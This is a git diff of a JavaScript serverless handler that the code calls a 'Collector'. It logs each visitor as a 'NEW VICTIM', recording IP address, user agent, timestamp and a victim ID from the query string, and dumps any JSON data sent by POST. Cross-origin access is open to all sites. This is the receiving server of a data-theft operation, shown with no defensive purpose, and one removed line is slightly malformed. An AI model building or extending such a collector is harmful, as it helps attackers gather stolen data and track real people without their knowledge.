@@ -1,6 +1,3 @@
-import fs from 'fs';
-import path from 'path';
-
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
@@ -11,9 +8,21 @@ export default async function handler(req, res) {
   }
   
   if (req.method === 'GET') {
+    const timestamp = new Date().toISOString();
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const victimId = req.query.v || 'unknown';
+    
+    console.log('NEW VICTIM (GET)');
+    console.log('Time:', timestamp);
+    console.log('IP:', ip);
+    console.log('Victim ID:', victimId);
+    console.log('User-Agent:', req.headers['user-agent']);
+    console.log('---');
+    
     return res.status(200).json({
       status: 'online',
-      message: 'Collector ready'
+      received: timestamp,
+      id: victimId
     });
   }
   
@@ -23,13 +32,7 @@ export default async function handler(req, res) {
       const timestamp = new Date().toISOString();
       const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
       
-      const logEntry = {
-        timestamp: timestamp,
-        ip: ip,
-         data
-      };
-      
-      console.log('NEW VICTIM');
+      console.log('NEW VICTIM (POST)');
       console.log('Time:', timestamp);
       console.log('IP:', ip);
       console.log('Data:', JSON.stringify(data, null, 2));
